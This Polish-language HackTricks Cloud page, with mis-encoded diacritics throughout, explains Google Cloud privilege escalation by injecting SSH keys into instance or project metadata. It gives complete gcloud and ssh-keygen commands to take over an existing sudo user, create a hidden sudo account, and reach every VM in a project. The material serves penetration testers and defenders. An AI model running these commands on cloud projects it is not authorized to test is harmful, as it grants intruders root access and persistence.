# GCP - Dodawanie niestandardowych metadanych SSH

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Modyfikowanie metadanych <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Modyfikacja metadanych na instancji moÅ¼e prowadziÄ‡ do **znaczÄ…cego ryzyka bezpieczeÅ„stwa, jeÅ›li atakujÄ…cy uzyska odpowiednie uprawnienia**.

### **Dodawanie kluczy SSH do niestandardowych metadanych**

W przypadku systemÃ³w **Linux** na GCP czÄ™sto wykonywane sÄ… skrypty z [Python Linux Guest Environment dla Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Istotnym elementem tego Å›rodowiska jest [demon kont](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), ktÃ³ry regularnie sprawdza punkt koÅ„cowy metadanych instancji w poszukiwaniu aktualizacji kluczy publicznych SSH.

Dlatego jeÅ›li atakujÄ…cy moÅ¼e modyfikowaÄ‡ niestandardowe metadane, moÅ¼e sprawiÄ‡, Å¼e demon znajdzie nowy klucz publiczny, ktÃ³ry zostanie przetworzony i **zintegrowany z lokalnym systemem**. Klucz zostanie dodany do pliku `~/.ssh/authorized_keys` istniejÄ…cego uÅ¼ytkownika lub potencjalnie utworzy nowego uÅ¼ytkownika z uprawnieniami `sudo`, w zaleÅ¼noÅ›ci od formatu klucza. AtakujÄ…cy bÄ™dzie w stanie skompromitowaÄ‡ hosta.

### **Dodawanie klucza SSH do istniejÄ…cego uprzywilejowanego uÅ¼ytkownika**

1. **SprawdÅº istniejÄ…ce klucze SSH na instancji:**
- Wykonaj polecenie, aby opisaÄ‡ instancjÄ™ i jej metadane w celu zlokalizowania istniejÄ…cych kluczy SSH. Odpowiednia sekcja w wyniku bÄ™dzie znajdowaÄ‡ siÄ™ w sekcji `metadata`, a konkretnie w kluczu `ssh-keys`.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- ZwrÃ³Ä‡ uwagÄ™ na format kluczy SSH: nazwa uÅ¼ytkownika poprzedza klucz, oddzielone dwukropkiem.

2. **Przygotuj plik tekstowy dla metadanych klucza SSH:**
- Zapisz szczegÃ³Å‚y nazw uÅ¼ytkownikÃ³w i odpowiadajÄ…cych im kluczy SSH do pliku tekstowego o nazwie `meta.txt`. Jest to niezbÄ™dne do zachowania istniejÄ…cych kluczy podczas dodawania nowych.

3. **Wygeneruj nowy klucz SSH dla docelowego uÅ¼ytkownika (`alice` w tym przykÅ‚adzie):**
- UÅ¼yj polecenia `ssh-keygen`, aby wygenerowaÄ‡ nowy klucz SSH, upewniajÄ…c siÄ™, Å¼e pole komentarza (`-C`) odpowiada nazwie uÅ¼ytkownika docelowego.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Dodaj nowy klucz publiczny do `meta.txt`, naÅ›ladujÄ…c format znaleziony w metadanych instancji.

4. **Zaktualizuj metadane klucza SSH instancji:**
- Zastosuj zaktualizowane metadane klucza SSH do instancji, uÅ¼ywajÄ…c polecenia `gcloud compute instances add-metadata`.
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **Uzyskaj dostÄ™p do instancji za pomocÄ… nowego klucza SSH:**
- PoÅ‚Ä…cz siÄ™ z instancjÄ… za pomocÄ… SSH, uÅ¼ywajÄ…c nowego klucza i uzyskaj dostÄ™p do powÅ‚oki w kontekÅ›cie docelowego uÅ¼ytkownika (`alice` w tym przykÅ‚adzie).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **UtwÃ³rz nowego uprzywilejowanego uÅ¼ytkownika i dodaj klucz SSH**

JeÅ›li nie znaleziono interesujÄ…cego uÅ¼ytkownika, moÅ¼na utworzyÄ‡ nowego, ktÃ³ry otrzyma uprawnienia `sudo`:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Klucze SSH na poziomie projektu <a href="#sshing-around" id="sshing-around"></a>

MoÅ¼liwe jest rozszerzenie dostÄ™pu SSH do wielu wirtualnych maszyn (VM) w Å›rodowisku chmurowym poprzez **zastosowanie kluczy SSH na poziomie projektu**. Ten sposÃ³b umoÅ¼liwia dostÄ™p SSH do dowolnej instancji w projekcie, ktÃ³ra nie zablokowaÅ‚a kluczy SSH na poziomie projektu. Oto podsumowana instrukcja:

1. **Zastosuj klucze SSH na poziomie projektu:**
- UÅ¼yj polecenia `gcloud compute project-info add-metadata`, aby dodaÄ‡ klucze SSH z pliku `meta.txt` do metadanych projektu. Ta czynnoÅ›Ä‡ zapewnia, Å¼e klucze SSH sÄ… rozpoznawane we wszystkich VM w projekcie, chyba Å¼e VM ma wÅ‚Ä…czonÄ… opcjÄ™ "Zablokuj klucze SSH na poziomie projektu".
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **SSH do instancji przy uÅ¼yciu kluczy na poziomie projektu:**
- Po zastosowaniu kluczy SSH na poziomie projektu, moÅ¼esz siÄ™ zalogowaÄ‡ przez SSH do dowolnej instancji w projekcie. Instancje, ktÃ³re nie blokujÄ… kluczy na poziomie projektu, zaakceptujÄ… klucz SSH, umoÅ¼liwiajÄ…c dostÄ™p.
- BezpoÅ›redniÄ… metodÄ… SSH do instancji jest uÅ¼ycie polecenia `gcloud compute ssh [INSTANCJA]`. Polecenie to uÅ¼ywa twojej bieÅ¼Ä…cej nazwy uÅ¼ytkownika i kluczy SSH ustawionych na poziomie projektu, aby sprÃ³bowaÄ‡ uzyskaÄ‡ dostÄ™p.

# References
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ **reklamÄ™ swojej firmy w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
